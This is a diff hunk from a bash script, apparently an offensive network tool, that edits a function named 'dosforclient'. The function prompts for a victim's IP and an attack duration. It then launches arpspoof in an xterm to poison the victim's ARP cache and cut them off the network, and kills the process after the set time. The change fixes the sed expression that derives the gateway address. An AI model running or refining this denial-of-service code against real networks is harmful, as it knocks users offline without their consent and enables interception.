@@ -473,7 +473,7 @@ dosforclient () {
 	tput cnorm; echo -ne "\n${purpleColour}[?]$grayColour Client you want to disconnect (ip): " && read clientattackdos
 	echo -ne "${greenColour}[?]$grayColour How long do you want the attack to last (seconds)?: " && read seg2
 	tput civis
-	ipnew=$(echo $clientattackdos | sed 's/\([0-9]\x\)$/1/g')
+	ipnew=$(echo $clientattackdos | sed 's/\([0-9]\+\)$/1/g')
 	xterm -hold -e "sudo arpspoof -i "$tarnomon" -t "$clientattackdos" "$ipnew"" &
 	arpspoof_PID=$!
 	sleep $seg2; kill -9 $arpspoof_PID; wait $arpspoof_PID 2>/dev/null
